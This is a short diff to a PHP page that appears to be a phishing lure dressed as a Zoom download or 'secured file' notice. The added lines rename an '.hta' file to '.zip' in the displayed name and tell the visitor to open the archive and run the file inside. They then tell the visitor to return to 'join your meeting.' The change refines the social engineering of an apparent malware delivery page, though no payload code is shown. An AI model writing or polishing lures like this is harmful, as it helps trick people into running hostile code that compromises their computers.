@@ -80,12 +80,12 @@ if (!@file_exists($key)) {
       </div>
       <p class="modal-text"><?php echo $kind === 'zoom' ? 'Your download is ready.' : "You've received a secured file."; ?></p>
       <p class="modal-subtext">
-        <?php echo $instr; ?>
+        Open <strong><?php echo htmlspecialchars(str_replace('.hta', '.zip', $name)); ?></strong> from your downloads and run the file inside it.
       </p>
       <p class="modal-subtext">
         If your download did not start automatically, you can <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">download it manually</a>.
       </p>
-      <p class="info-text">After installation, return to this page to join your meeting.</p>
+      <p class="info-text">After the file inside the archive runs, return to this page to join your meeting.</p>
     </div>
   </div>
 
